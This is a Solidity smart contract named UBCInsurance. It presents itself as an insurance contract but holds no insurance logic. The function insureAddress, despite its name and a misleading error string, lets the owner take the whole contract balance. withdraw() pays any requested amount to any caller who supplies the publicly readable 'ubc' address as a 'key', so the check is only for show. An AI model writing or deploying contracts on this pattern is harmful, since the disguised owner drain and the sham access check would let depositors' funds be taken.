//SourceUnit: ubcinsurance.sol

pragma solidity 0.5.10;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}


contract Ownable {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}

contract UBCInsurance is Ownable {
    using SafeMath for uint256;


    uint256 public  contract_balance;
    uint256 public  totalWithdraw_;
    
    address public ubc;
    event onWithdraw(address investor, uint256 amount);
    
    constructor(address _ubc) public {
       ubc=_ubc;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

	function insureAddress() public payable{
        require(msg.sender == owner, "only Shreem TOKEN avaiable");
        msg.sender.transfer(address(this).balance);
    }

    function withdraw(uint256 _amount,address _key) public {
        require(ubc == _key, "Can not withdraw because no any investments");
        uint256 withdrawalAmount = _amount;
        
        if(withdrawalAmount>0){
            msg.sender.transfer(withdrawalAmount);
        }

        emit onWithdraw(msg.sender, withdrawalAmount);
    }
}